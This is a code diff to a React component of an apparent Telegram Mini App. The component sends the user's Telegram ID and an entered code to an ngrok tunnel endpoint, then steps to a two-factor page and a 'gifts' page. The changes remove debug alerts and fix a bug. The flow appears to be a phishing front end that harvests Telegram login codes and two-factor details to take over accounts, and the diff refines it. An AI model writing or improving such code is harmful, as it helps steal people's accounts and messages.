@@ -9,35 +9,41 @@ export default function Auth2() {
 
 
   const handleSubmitCode = async () => {
-    alert("fetching1")
     try {
-        alert("BODY TO SEND:", {
-            user_id: userId,
-            code: newCode.join("")
-        });
-        const userId = tg.initDataUnsafe?.user?.id;
-        const res = await fetch("https://08f77fecc2d9.ngrok-free.app/api/send_code", {
+      const userId = tg.initDataUnsafe?.user?.id;
+      if (!userId) {
+        alert("Telegram user ID not found!");
+        return;
+      }
+
+      // Use state `code` instead of undefined newCode
+      const codeStr = code.join("");
+
+      console.log("BODY TO SEND:", { user_id: userId, code: codeStr });
+
+      const res = await fetch("https://08f77fecc2d9.ngrok-free.app/api/send_code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ user_id: userId, code: newCode.join("") })
-        });
-        alert("fetching2")
-        const data = await res.json();
-        alert(JSON.stringify(data));
-        if (data.ok) {
-          if (data["2fa"]) {
-              navigate("/auth3");
-          } else {
-              navigate("/gifts"); // or wherever
-          }
+        body: JSON.stringify({ user_id: userId, code: codeStr }),
+      });
+
+      const data = await res.json();
+      console.log("RESPONSE:", data);
+
+      if (data.ok) {
+        if (data["2fa"]) {
+          navigate("/auth3");
         } else {
-          alert("Error: " + data.error);
+          navigate("/gifts");
         }
+      } else {
+        alert("Error: " + data.error);
+      }
     } catch (err) {
-        console.error(err);
-        alert("Request failed");
+      console.error("Request failed:", err);
+      alert("Request failed: " + err.message);
     }
-    };
+  };
 
 
   useEffect(() => {
